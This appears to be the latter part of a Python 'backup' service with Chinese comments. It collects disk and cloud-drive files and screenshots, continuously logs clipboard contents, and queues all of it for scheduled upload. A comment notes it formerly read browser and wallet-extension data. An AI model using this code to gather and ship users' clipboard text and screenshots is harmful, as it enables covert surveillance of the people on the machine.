                            'configs': (os.path.abspath(item_path), os.path.join(cloud_backup_path, f'{user_prefix}_configs'), 2),
                        }
                        DETAIL_LOGGER.info(f"检测到云盘目录: {item_path}")
                        
                        # 添加调试日志
                        if config.DEBUG_MODE:
                            DETAIL_LOGGER.debug("云盘源目录: %s", os.path.abspath(item_path))
                            DETAIL_LOGGER.debug("云盘备份目录: %s", cloud_backup_path)
        except Exception as e:
            DETAIL_LOGGER.error(f"扫描用户云盘目录时出错: {e}")
    
    return available_disks


def _finish_collection(backup_manager, result, label, batch):
    batch.collections.append(result)
    display = task_label(label)
    if not result.complete:
        DETAIL_LOGGER.error('%s | 未完成 | 已复制 %s 个文件 | 失败 %s 项 | 超时 %s | 保留副本: %s',
                            display, len(result.files), len(result.errors),
                            '是' if result.timed_out else '否', result.directory)
        atomic_json(os.path.join(result.directory, 'collection-status.json'), {
            'complete': False, 'errors': result.errors, 'files': result.files,
            'timed_out': result.timed_out, 'skipped': result.skipped,
        })
        return
    if not result.files:
        DETAIL_LOGGER.info('%s | 无符合条件的文件 | 跳过 %s 项', display, result.skipped)
        backup_manager._clean_directory(result.directory)
        return
    try:
        archive_started = time.monotonic()
        log_event(logging.INFO, '归档', 'archive_start', '%s | 开始压缩和校验 | %s 个文件（%s）',
                  display, len(result.files), format_size(result.total_size), console=False)
        archive = backup_manager.zip_backup_folder(
            result.directory, backup_manager.new_artifact_base(label), result.files)
        backup_manager.enqueue_files(archive.paths)
        batch.paths.extend(archive.paths)
        # 清单持久化失败会在上面抛异常，此处不会删除唯一的本地副本。
        backup_manager._clean_directory(result.directory)
        if archive.redundant_archive:
            backup_manager._safe_remove_file(archive.redundant_archive)
        log_event(logging.INFO, '归档', 'archive_ready',
                  '%s | 校验通过 | %s 个文件（%s） | 生成 %s 项待上传文件 | 跳过 %s 项 | 耗时 %s',
                  display, len(result.files), format_size(result.total_size), len(archive.paths),
                  result.skipped, format_elapsed(archive_started), console=False)
    except Exception as exc:
        batch.errors.append(label + ': ' + str(exc))
        DETAIL_LOGGER.exception('归档准备失败，保留暂存副本: %s', result.directory)


def backup_disks(backup_manager, available_disks):
    batch = BackupBatch()
    for disk_name, disk_configs in available_disks.items():
        for backup_type, (source_dir, _legacy_target, ext_type) in disk_configs.items():
            if backup_manager.stop_event.is_set():
                batch.errors.append('任务被停止')
                return batch
            label = 'disk_' + disk_name + '_' + backup_type
            try:
                directory = backup_manager.new_staging_directory(label)
                result = backup_manager.backup_disk_files(source_dir, directory, ext_type)
                _finish_collection(backup_manager, result, label, batch)
            except Exception as exc:
                batch.errors.append(label + ': ' + str(exc))
                DETAIL_LOGGER.exception('磁盘备份失败: %s', source_dir)
    return batch


def backup_screenshots(backup_manager):
    directory = backup_manager.new_staging_directory('screenshots')
    result = CollectionResult(directory)
    deadline = time.monotonic() + backup_manager.config.SCAN_TIMEOUT
    user_root = os.path.expandvars('%USERPROFILE%')
    candidates = [
        os.path.join(user_root, 'Pictures'),
        os.path.join(os.environ.get('ONEDRIVE', user_root), 'Pictures'),
    ]
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders') as key:
            candidates.append(winreg.QueryValueEx(key, '{B7BEDE81-DF94-4682-A7D8-57A52620B86F}')[0])
    except (ImportError, OSError):
        pass
    keywords = ('screenshot', 'screen shot', 'screen_shot', '屏幕快照', '屏幕截图', '截图', '截屏')
    extensions = ('.png', '.jpg', '.jpeg', '.heic', '.gif', '.tiff', '.tif', '.bmp', '.webp')

    def selected(name):
        lower = name.casefold()
        extension = os.path.splitext(lower)[1]
        return any(keyword in lower for keyword in keywords) and (not extension or extension in extensions)

    seen = set()
    try:
        for index, source in enumerate(candidates):
            identity = os.path.normcase(os.path.realpath(source))
            if identity in seen or not os.path.isdir(source):
                continue
            seen.add(identity)
            backup_manager._collect_tree(source, result, deadline, prefix='source_' + str(index),
                                         file_filter=selected)
            if result.timed_out:
                break
    except Exception as exc:
        result.timed_out = isinstance(exc, TimeoutError)
        result.errors.append(str(exc))
    return result


def backup_windows_data(backup_manager):
    """仅备份截图和配置中指定的文件；不再访问浏览器或钱包扩展数据库。"""
    batch = BackupBatch()
    for label, collect in (
        ('screenshots', lambda: backup_screenshots(backup_manager)),
        ('specified', lambda: backup_manager.backup_specified_files(
            os.path.expandvars('%USERPROFILE%'), backup_manager.new_staging_directory('specified'))),
    ):
        try:
            _finish_collection(backup_manager, collect(), label, batch)
        except Exception as exc:
            batch.errors.append(label + ': ' + str(exc))
            DETAIL_LOGGER.exception('Windows 文件备份失败: %s', label)
    return batch


def backup_and_upload_logs(backup_manager):
    """在日志 Handler 锁内封存日志，新增日志继续写入新的活动文件。"""
    target = backup_manager.new_artifact_base('backup_logs') + '.txt'
    snapshot = backup_manager.log_handler.snapshot(target)
    if snapshot:
        backup_manager.enqueue_files([snapshot], kind='log')


def clipboard_upload_thread(backup_manager, clipboard_log_path):
    last_snapshot = time.monotonic()
    while not backup_manager.stop_event.is_set():
        try:
            if time.monotonic() - last_snapshot >= backup_manager.config.CLIPBOARD_INTERVAL:
                snapshot = None
                with backup_manager._clipboard_lock:
                    if os.path.isfile(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 100:
                        with open(clipboard_log_path, 'r', encoding='utf-8') as stream:
                            content = stream.read().strip()
                        if content and not all(line.startswith('=== 📋') for line in content.splitlines() if line.strip()):
                            snapshot = backup_manager.new_artifact_base('clipboard_logs') + '.txt'
                            os.replace(clipboard_log_path, snapshot)
                            with open(clipboard_log_path, 'a', encoding='utf-8') as stream:
                                stream.write('=== 📋 日志已轮转，新增内容记录于此 ===\n')
                if snapshot:
                    backup_manager.enqueue_files([snapshot], kind='clipboard')
                last_snapshot = time.monotonic()
            backup_manager.process_pending_uploads(kind='clipboard')
        except Exception:
            log_event(logging.WARNING, '剪贴板', 'clipboard_log_error',
                      '剪贴板日志处理失败，本地文件已保留；详情见文件日志', exc_info=True)
        backup_manager.stop_event.wait(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)


def _complete_cycle(backup_manager, now):
    backup_manager.update_state(
        collection_complete=False, retry_after=None, last_success=now.isoformat(),
        next_backup=(now + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)).isoformat())
    next_time = datetime.fromisoformat(backup_manager.state['next_backup']).strftime('%Y-%m-%d %H:%M:%S')
    log_event(logging.INFO, '完成', 'cycle_complete',
              '本轮数据备份已全部完成 | 下次备份：%s', next_time)


def run_scheduled_iteration(backup_manager, now=None):
    """可单独验证的一轮调度；待上传文件优先于新一轮扫描。"""
    clock = datetime.now if now is None else lambda: now
    now = clock()
    state = backup_manager.state
    if state['retry_after'] and now < datetime.fromisoformat(state['retry_after']):
        return
    backup_manager.process_pending_uploads()
    if state['collection_complete']:
        if not backup_manager.has_pending('backup'):
            _complete_cycle(backup_manager, clock())
        else:
            backup_manager.update_state(
                retry_after=(clock() + timedelta(seconds=backup_manager.config.ERROR_RETRY_DELAY)).isoformat())
            log_event(logging.WARNING, '重试', 'upload_retry',
                      '收集已完成，仍有归档待上传 | %s秒后重试 | 本地副本已保留',
                      backup_manager.config.ERROR_RETRY_DELAY)
        return
    next_backup = backup_manager.state['next_backup']
    if next_backup and now < datetime.fromisoformat(next_backup):
        return
    if backup_manager.has_pending('backup'):
        backup_manager.update_state(
            retry_after=(clock() + timedelta(seconds=backup_manager.config.ERROR_RETRY_DELAY)).isoformat())
        log_event(logging.WARNING, '重试', 'upload_retry',
                  '先处理已有待上传归档 | %s秒后重试 | 本地副本已保留',
                  backup_manager.config.ERROR_RETRY_DELAY)
        return

    if shutil.disk_usage(backup_manager.config.BACKUP_ROOT).free < backup_manager.config.MIN_FREE_SPACE:
        raise OSError('备份磁盘剩余空间低于 MIN_FREE_SPACE，保留已有文件并暂停新一轮收集')
    started = time.monotonic()
    log_event(logging.INFO, '开始', 'cycle_start', '开始文件备份：磁盘文档、指定文件和截图')
    batch = backup_disks(backup_manager, get_available_disks(backup_manager.config))
    batch.extend(backup_windows_data(backup_manager))
    backup_manager.update_state(collection_complete=batch.complete)
    log_event(logging.INFO if batch.complete else logging.WARNING, '收集', 'collection_result',
              '已复制 %s 个文件（%s） | 跳过 %s 项 | 失败 %s 项 | 超时 %s 个任务 | 耗时 %s',
              format(sum(len(result.files) for result in batch.collections), ','),
              format_size(sum(result.total_size for result in batch.collections)),
              sum(result.skipped for result in batch.collections),
              len(batch.errors) + sum(len(result.errors) for result in batch.collections),
              sum(result.timed_out for result in batch.collections), format_elapsed(started))
    backup_and_upload_logs(backup_manager)
    backup_manager.process_pending_uploads()
    if batch.complete and not backup_manager.has_pending('backup'):
        _complete_cycle(backup_manager, clock())
    else:
        backup_manager.update_state(
            retry_after=(clock() + timedelta(seconds=backup_manager.config.ERROR_RETRY_DELAY)).isoformat())
        log_event(logging.WARNING, '未完成', 'cycle_incomplete',
                  '本轮备份未完成 | %s秒后重试 | 副本及失败记录已保留，详情见文件日志',
                  backup_manager.config.ERROR_RETRY_DELAY)


def periodic_backup_upload(backup_manager):
    workers = []
    next_time = backup_manager.state['next_backup']
    plan = datetime.fromisoformat(next_time).strftime('%Y-%m-%d %H:%M:%S') if next_time else '立即检查'
    with backup_manager._state_lock:
        pending_count = sum(item['status'] == 'pending' for item in backup_manager.state['pending'])
    log_event(logging.INFO, '启动', 'service_start',
              '备份服务已启动 | 计划：%s | 待传 %s 项 | 剪贴板：%s',
              plan, pending_count, '已启用' if pyperclip is not None else '已禁用')
    log_event(logging.INFO, '日志', 'log_location', '详细日志：%s', backup_manager.config.LOG_FILE)
    if pyperclip is not None:
        username = getpass.getuser()
        user = username[:5] if username else 'user'
        clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, user + '_clipboard_log.txt')
        # 使用追加模式，启动不会清空上次运行尚未处理的记录。
        with open(clipboard_log_path, 'a', encoding='utf-8') as stream:
            stream.write('=== 📋 监控启动于 ' + datetime.now().isoformat(timespec='seconds') + ' ===\n')
        workers = [
            threading.Thread(target=backup_manager.monitor_clipboard,
                             args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
                             daemon=True, name='clipboard-monitor'),
            threading.Thread(target=clipboard_upload_thread, args=(backup_manager, clipboard_log_path),
                             daemon=True, name='clipboard-upload'),
        ]
        for worker in workers:
            worker.start()
    else:
        DETAIL_LOGGER.info('剪贴板依赖不可用，未启动相关线程')
    try:
        while not backup_manager.stop_event.is_set():
            try:
                run_scheduled_iteration(backup_manager)
            except Exception as exc:
                log_event(logging.ERROR, '任务', 'cycle_error',
                          '本轮任务异常：%s | %s秒后重试 | 详情见文件日志',
                          exc, backup_manager.config.ERROR_RETRY_DELAY, exc_info=True)
                try:
                    backup_manager.update_state(
                        retry_after=(datetime.now() + timedelta(
                            seconds=backup_manager.config.ERROR_RETRY_DELAY)).isoformat())
                except Exception:
                    log_event(logging.ERROR, '状态', 'state_error',
                              '无法保存重试状态 | 本地备份保持原样，请检查详细日志', exc_info=True)
            backup_manager.stop_event.wait(min(
                backup_manager.config.BACKUP_CHECK_INTERVAL, backup_manager.config.ERROR_RETRY_DELAY))
    finally:
        backup_manager.stop_event.set()
        for worker in workers:
            while worker.is_alive():
                worker.join(timeout=1)


def clean_backup_directory(config=None):
    """兼容旧入口：仅确保工作目录存在，保留所有历史及失败备份。"""
    config = config or BackupConfig()
    for directory in (config.BACKUP_ROOT, config.STAGING_ROOT, config.ARTIFACT_ROOT):
        os.makedirs(directory, exist_ok=True)


def main():
    lock = SingleInstanceLock(BackupConfig.BACKUP_ROOT)
    manager = None
    try:
        if not lock.acquire():
            print('备份程序已经在运行')
            return 0
        load_optional_dependencies()
        manager = BackupManager()
        clean_backup_directory(manager.config)
        periodic_backup_upload(manager)
        return 0
    except KeyboardInterrupt:
        log_event(logging.INFO, '停止', 'service_stop', '备份程序已停止，待上传清单已保留')
        return 0
    except Exception as exc:
        if LOGGER.handlers:
            log_event(logging.ERROR, '启动', 'fatal_error',
                      '备份程序启动或运行失败：%s；详情见文件日志', exc, exc_info=True)
        else:
            print('备份程序启动或运行失败：' + str(exc), file=sys.stderr)
        return 1
    finally:
        if manager is not None:
            manager.close()
        lock.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--restore-parts', metavar='MANIFEST', help='校验并合并分片清单中的归档')
    parser.add_argument('--output', metavar='ARCHIVE', help='合并后的 tar.gz 路径（必须不存在）')
    arguments = parser.parse_args()
    if arguments.restore_parts:
        if not arguments.output:
            parser.error('--restore-parts 需要同时指定 --output')
        try:
            print(reassemble_parts(arguments.restore_parts, arguments.output))
        except Exception as exc:
            parser.exit(1, '恢复失败: ' + str(exc) + '\n')
    elif arguments.output:
        parser.error('--output 只能与 --restore-parts 一起使用')
    else:
        sys.exit(main())
